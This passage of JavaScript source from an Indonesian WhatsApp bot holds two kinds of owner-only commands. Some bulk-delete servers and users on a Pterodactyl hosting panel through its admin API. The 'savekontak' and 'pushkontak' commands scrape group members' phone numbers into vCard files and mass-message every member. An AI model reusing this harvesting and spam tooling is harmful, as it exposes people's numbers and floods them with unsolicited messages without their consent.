let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await client.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `${botname}\nAuto Cek Server Panel`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Hapus Adp`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return reply("Akun admin panel tidak ditemukan!")
await reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Delete Panel`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return reply("Server panel tidak ditemukan!")
reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case 'deladminall': {
if (!isCreator) return reply(mess.owner)
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .deladminall , 48, 49, 50');
    }

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return reply('Tidak ada user yang ditemukan.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati proses penghapusan
            if (excludeIds.includes(u.id.toString())) {
                reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})`);
                continue;
            }

            let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteUser.ok) {
                reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n`);
            } else {
                let errorText = await deleteUser.text();
                reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
    } catch (error) {
        return reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

//================================================================================

case 'deluserall-v2': {
if (!isCreator) return reply(mess.owner)
 
 try {
 // Mengambil daftar user dari server 2
 let f = await fetch(global.domainV2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domainV2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 reply('*Semua user kecuali admin berhasil dihapus dari server 2!*');
 } catch (error) {
 return reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'deluserall': {
if (!isCreator) return reply(mess.owner)
 
 try {
 // Mengambil daftar user dari server 1
 let f = await fetch(global.domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 reply('*Semua user kecuali admin berhasil dihapus dari server 1!*');
 } catch (error) {
 return reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'clearall-v2': {
 const argsString = body.trim();
 const [serverIdsString, adminIdsString] = argsString.split('|').map(part => part.trim()); // Memisahkan ID server dan ID admin
 const excludedServerIds = serverIdsString.split(',').slice(1).map(id => id.trim()); // ID server yang dikecualikan
 const excludedAdminIds = adminIdsString ? adminIdsString.split(',').map(id => id.trim()) : []; // ID admin yang dikecualikan

 if (excludedServerIds.length === 0 && excludedAdminIds.length === 0) {
 return reply('Tolong masukkan ID server dan/atau ID admin yang ingin dikecualikan.\nContoh: .clearall-v2 ,idserver,idserver,idserver|idadmin,idadmin,idadmin');
 }

 try {
 // =======================
 // Proses Hapus Server
 // =======================
 let fServers = await fetch(global.domainV2 + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 let serverRes = await fServers.json();
 let servers = serverRes.data;

 if (!servers || servers.length === 0) {
 reply('Tidak ada server yang ditemukan.');
 } else {
 for (let server of servers) {
 let s = server.attributes;

 if (excludedServerIds.includes(s.id.toString())) {
 reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 let deleteServer = await fetch(global.domainV2 + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 if (deleteServer.ok) {
 reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }
 reply('*Proses penghapusan server selesai!*');
 }

 // =======================
 // Proses Hapus Admin
 // =======================
 let fAdmins = await fetch(global.domainV2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 let adminRes = await fAdmins.json();
 let users = adminRes.data;

 if (!users || users.length === 0) {
 reply('Tidak ada user yang ditemukan.');
 } else {
 for (let user of users) {
 let u = user.attributes;

 if (excludedAdminIds.includes(u.id.toString())) {
 reply(`*Admin dengan ID ${u.id} (${u.username}) dikecualikan dari penghapusan.*`);
 continue;
 }

 let deleteUser = await fetch(global.domainV2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 if (deleteUser.ok) {
 reply(`*Berhasil menghapus user dengan ID: ${u.id} (${u.username})*`);
 } else {
 let errorText = await deleteUser.text();
 reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 reply('*Proses penghapusan admin selesai!*');
 }

 } catch (error) {
 reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'clearall':
if (!isCreator) return reply(mess.owner)
{
 const argsString = body.trim();
 const [serverIdsString, adminIdsString] = argsString.split('|').map(part => part.trim()); // Memisahkan ID server dan ID admin
 const excludedServerIds = serverIdsString.split(',').slice(1).map(id => id.trim()); // ID server yang dikecualikan
 const excludedAdminIds = adminIdsString ? adminIdsString.split(',').map(id => id.trim()) : []; // ID admin yang dikecualikan

 if (excludedServerIds.length === 0 && excludedAdminIds.length === 0) {
 return reply('Tolong masukkan ID server dan/atau ID admin yang ingin dikecualikan.\nContoh: .clearall ,idserver,idserver,idserver|idadmin,idadmin,idadmin');
 }

 try {
 // =======================
 // Proses Hapus Server
 // =======================
 let fServers = await fetch(global.domain + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 let serverRes = await fServers.json();
 let servers = serverRes.data;

 if (!servers || servers.length === 0) {
 reply('Tidak ada server yang ditemukan.');
 } else {
 for (let server of servers) {
 let s = server.attributes;

 // Jika server ID ada di daftar pengecualian, lewati
 if (excludedServerIds.includes(s.id.toString())) {
 reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus server
 let deleteServer = await fetch(global.domain + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 if (deleteServer.ok) {
 reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }
 reply('*Proses penghapusan server selesai!*');
 }

 // =======================
 // Proses Hapus Admin
 // =======================
 let fAdmins = await fetch(global.domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 let adminRes = await fAdmins.json();
 let users = adminRes.data;

 if (!users || users.length === 0) {
 reply('Tidak ada user yang ditemukan.');
 } else {
 for (let user of users) {
 let u = user.attributes;

 // Jika ID admin ada di daftar pengecualian, lewati proses penghapusan
 if (excludedAdminIds.includes(u.id.toString())) {
 reply(`*Admin dengan ID ${u.id} (${u.username}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus user
 let deleteUser = await fetch(global.domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 if (deleteUser.ok) {
 reply(`*Berhasil menghapus user dengan ID: ${u.id} (${u.username})*`);
 } else {
 let errorText = await deleteUser.text();
 reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 reply('*Proses penghapusan admin selesai!*');
 }

 } catch (error) {
 reply('Terjadi kesalahan: ' + error.message);
 }
 break;

}

case 'delpanelall': {
if (!isCreator) return reply(mess.owner)
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .delpanelall , 101, 102, 103');
    }

    try {
        // Mendapatkan daftar server
        let f = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return reply('Tidak ada server yang ditemukan.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(domain + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteServer.ok) {
                reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        reply('*Semua server berhasil dihapus kecuali yang dikecualikan!*');
    } catch (error) {
        return reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

//================================================================================

case "plooo": {
await slideButton(m.chat)
}
break

//================================================================================

case "savekontak": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(example("idgrupnya"))
let res = await client.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./storage/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Danny S8X - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./storage/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`*Succes Create File Kontak*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./storage/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: loli })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./storage/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./storage/database/contacts.vcf", "")
}}
break
//================================================================================

case "savekontak2": {
if (!isOwner) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./storage/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Danny S8X - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./storage/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`*Berhasil membuat file kontak*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./storage/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: loli })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./storage/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./storage/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak2": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return reply("Format Delay Tidak Valid")
if (!teks) return reply("*Contoh Command :*\n.pushkontak2 idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nketik *.listgc* untuk melihat semua list id grup")
var groupMetadataa
try {
groupMetadataa = await client.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./storage/database/contacts.json', JSON.stringify(contacts))
await client.sendMessage(mem, {text: teks}, {quoted: loli})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${namaowner}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./storage/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./storage/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: loli })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./storage/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./storage/database/contacts.vcf", "")
}}
break

case "pushkontak1": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await client.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./storage/database/contacts.json', JSON.stringify(contacts))
await client.sendMessage(mem, {text: teks}, {quoted: loli})
await sleep(global.delayPushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${namaowner}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./storage/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./storage/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: loli })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./storage/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./storage/database/contacts.vcf", "")
}}
break

//================================================================================

case "pushkontak3": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
if (!text.split("|")) return reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var idnya = text.split("|")[0]
var teks = text.split("|")[1]
var groupMetadataa
try {
groupMetadataa = await client.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./storage/database/contacts.vcf', JSON.stringify(contacts))
let msgii = generateWAMessageFromContent(mem, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"KLIK INI BUAT SAVE WA KU\",\"url\":\"https://wa.me//${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: loli}) 
await client.relayMessage(mem,msgii.message, { 
messageId: msgii.key.id 
})
await sleep(3000)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${namaowner}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./storage/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await client.sendMessage(m.sender, { document: fs.readFileSync("./storage/database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: loli })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./storage/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./storage/database/contacts.vcf", "")
}}
break


case "pushkontak": {
if (!isOwner) return reply(mess.owner)
if (!text) return reply(example("pesannya"))
const meta = await client.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname2}\nPush Kontak`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli}) 
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await client.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await client.sendMessage(mem, {text: teks}, {quoted: loli })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await client.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: loli})
}
break

case "addidch": case "addch": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example("idchnya"))
if (!text.endsWith("@newsletter")) return reply("Id channel tidak valid")
let input = text
if (listidch.includes(input)) return reply(`Id ${input2} sudah terdaftar!`)
listidch.push(input)
await fs.writeFileSync("./storage/database/listidch.json", JSON.stringify(listidch, null, 2))
reply(`Berhasil menambah id channel kedalam database ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delidch": case "delch": {
if (!isCreator) return reply(mess.owner)
if (listidch.length < 1) return reply("Tidak ada id channel di database")
if (!text) return reply(example("idchnya"))
if (text.toLowerCase() == "all") {
